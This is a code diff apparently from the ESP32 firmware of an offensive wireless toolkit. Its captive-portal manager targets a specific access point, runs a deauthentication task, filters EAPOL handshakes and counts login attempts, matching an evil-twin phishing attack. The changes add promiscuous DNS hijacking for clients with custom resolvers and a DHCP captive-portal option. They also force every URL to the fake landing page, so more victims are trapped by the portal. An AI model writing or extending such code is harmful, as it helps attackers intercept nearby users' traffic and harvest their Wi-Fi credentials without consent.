@@ -3,6 +3,7 @@
 #include "sniffer.h"
 
 #include <esp_wifi_ap_get_sta_list.h>
+#include <esp_idf_version.h>
 
 #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
     #include <FFat.h>
@@ -105,6 +106,11 @@ bool PortalManager::restoreIdleAp() {
 
 void PortalManager::cleanupFailedStart() {
     _running = false;
+    Sniffer::instance()->setDnsHijack(false);
+    if (_snifferStarted) {
+        Sniffer::instance()->stop();
+        _snifferStarted = false;
+    }
     teardownServerAndDns();
     if (_deauthTaskHandle) {
         vTaskDelete(_deauthTaskHandle);
@@ -264,6 +270,16 @@ void PortalManager::sendPortalContent(AsyncWebServerRequest* request) {
     }
 }
 
+void PortalManager::sendLandingResponse(AsyncWebServerRequest* request) {
+    if (_showNotice) {
+        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", noticePage());
+        addNoCacheHeaders(response);
+        request->send(response);
+    } else {
+        sendPortalContent(request);
+    }
+}
+
 void PortalManager::setupRoutes() {
     _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
         emitClientSeen(request, "GET /");
@@ -275,13 +291,7 @@ void PortalManager::setupRoutes() {
         ev["client_ip"] = request->client()->remoteIP().toString();
         if (_proto) _proto->sendEvent("portal_viewed", ev);
 
-        if (_showNotice) {
-            AsyncWebServerResponse* response = request->beginResponse(200, "text/html", noticePage());
-            addNoCacheHeaders(response);
-            request->send(response);
-        } else {
-            sendPortalContent(request);
-        }
+        sendLandingResponse(request);
     });
 
     _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
@@ -315,8 +325,13 @@ void PortalManager::setupRoutes() {
     });
 
     _server->onNotFound([this](AsyncWebServerRequest* request) {
-        emitClientSeen(request, "GET other");
-        request->redirect("http://192.168.4.1/");
+        // Force every unmatched URI to the landing page. This covers OS captive
+        // probe paths, arbitrary 404s, and user-typed URLs without relying on
+        // the client following a redirect. /login and /continue remain routed
+        // by their explicit handlers above. Serving the page directly also
+        // prevents redirect loops on clients that do not follow 3xx responses.
+        emitClientSeen(request, "forced route");
+        sendLandingResponse(request);
     });
 }
 
@@ -390,10 +405,13 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         }
         _apStarted = true;
 
+        const IPAddress portalIp(192, 168, 4, 1);
         const bool cfgOk = WiFi.softAPConfig(
-            IPAddress(192, 168, 4, 1),
-            IPAddress(192, 168, 4, 1),
-            IPAddress(255, 255, 255, 0)
+            portalIp,
+            portalIp,
+            IPAddress(255, 255, 255, 0),
+            IPAddress(192, 168, 4, 2),
+            portalIp
         );
         if (!cfgOk) {
             NRSUITE_DEBUG_PRINTLN("PORTAL: WiFi.softAPConfig failed");
@@ -405,6 +423,15 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
             }
             break;
         }
+
+        // Advertise the portal as the DHCP captive-portal URI and as the
+        // primary DNS resolver. This covers clients that honour DHCP options;
+        // the promiscuous DNS hook below covers clients with a manual resolver.
+        #if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
+        if (!WiFi.AP.enableDhcpCaptivePortal()) {
+            NRSUITE_DEBUG_PRINTLN("PORTAL: DHCP captive-portal URI option failed");
+        }
+        #endif
 
         wifi_config_t cfg{};
         err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
@@ -502,12 +529,21 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     }
 
     _running = true;
+    Sniffer::instance()->setDnsHijack(true, WiFi.softAPIP());
     if (targetBssid) {
         memcpy(_targetBssid, targetBssid, 6);
         _hasTarget = true;
         Sniffer::instance()->setEapolFilter(true, targetBssid);
-        Sniffer::instance()->startFixed(channel);
+        _snifferStarted = Sniffer::instance()->startFixed(channel);
         xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
+    } else {
+        _snifferStarted = Sniffer::instance()->startDnsHijack(channel);
+    }
+    if (!_snifferStarted) {
+        // lwIP's wildcard DNS server still works for DHCP-configured clients;
+        // custom-resolver interception is best-effort and must not block the AP.
+        Sniffer::instance()->setDnsHijack(false);
+        NRSUITE_DEBUG_PRINTLN("PORTAL: custom-DNS interception unavailable");
     }
     NRSUITE_DEBUG_PRINTF("PORTAL: started successfully, heap=%lu\n",
                   (unsigned long)ESP.getFreeHeap());
@@ -622,6 +658,11 @@ void PortalManager::stop() {
     _loginAttempts = 0;
     _hasTarget = false;
     if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
+    Sniffer::instance()->setDnsHijack(false);
+    if (_snifferStarted) {
+        Sniffer::instance()->stop();
+        _snifferStarted = false;
+    }
     teardownServerAndDns();
 
     // Only tear down the AP if this portal owned it. stopAllModules() calls
